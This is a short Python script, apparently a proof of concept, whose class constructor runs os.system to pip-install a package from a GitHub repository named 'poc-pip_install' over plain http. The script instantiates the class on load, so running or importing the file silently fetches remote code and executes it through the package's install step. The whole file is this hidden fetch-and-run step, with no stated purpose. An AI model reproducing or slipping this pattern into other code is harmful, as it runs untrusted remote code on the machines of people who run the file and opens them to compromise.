import os
import platform

class Principal(object):
    
    def __init__(self):
        os.system("pip install --editable=git+http://github.com/Junior743/poc-pip_install@1.2.4#egg=poc-pip_install")

Principal()
